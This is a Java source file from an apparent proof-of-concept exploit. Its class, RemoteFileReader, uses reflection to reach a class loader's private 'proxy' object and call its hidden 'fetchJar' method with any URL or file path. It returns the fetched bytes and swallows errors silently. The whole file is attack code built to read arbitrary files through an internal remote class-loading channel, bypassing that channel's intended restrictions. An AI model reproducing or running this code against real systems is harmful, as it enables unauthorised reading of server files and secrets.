package poc;

import java.net.URL;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;


public final class RemoteFileReader {
    private ClassLoader ccl = null;

    public RemoteFileReader(ClassLoader ccl) {
        this.ccl = ccl;
    }

    public byte[] readAsBytes(String filepath) {
        try {
            //System.out.println("Reading " + filepath);
            final Field classLoaderProxyField = this.ccl.getClass().getDeclaredField("proxy");
            classLoaderProxyField.setAccessible(true);
            final Object theProxy = classLoaderProxyField.get(this.ccl);
            final Method fetchJarMethod = theProxy.getClass().getDeclaredMethod("fetchJar", URL.class);
            fetchJarMethod.setAccessible(true);
            final byte[] fetchJarResponse = (byte[]) fetchJarMethod.invoke(theProxy, new URL(filepath));
            return fetchJarResponse;
        } catch (Exception e) {
           //System.out.println("Exception: " + e.getMessage());
        }
        return new byte[0];
    }

    public String readAsString(String path) {
        return new String(readAsBytes(path));
    }
}
